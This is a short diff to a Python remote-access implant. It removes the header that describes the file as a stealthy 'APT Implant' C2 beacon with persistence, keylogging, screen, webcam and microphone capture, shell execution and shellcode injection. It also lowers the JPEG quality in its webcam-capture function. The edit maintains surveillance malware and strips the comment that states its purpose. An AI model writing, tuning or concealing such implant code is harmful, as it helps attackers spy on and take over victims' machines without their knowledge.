@@ -1,10 +1,3 @@
-# implant.py - Python APT Implant (Stealthy C2 Beacon)
-# Feasibility prototype mirroring Go version capabilities
-# Features: Beaconing w/ jitter & UA rotation, AES-GCM comms, persistence,
-#           screenshot (mss), webcam (opencv), mic (pyaudio), keylogger (keyboard/pywin32),
-#           shell exec, file up/down, shellcode injection (ctypes)
-# Requires: pip install requests cryptography mss opencv-python pyaudio keyboard pywin32 wmi
-
 import os
 import io
 import queue
@@ -148,7 +141,7 @@ def capture_webcam():
     cap.release()
     if not ret:
         raise Exception("Webcam failed")
-    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
+    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
     return buf.tobytes()
 
 def record_mic(seconds=10):
@@ -565,3 +558,4 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
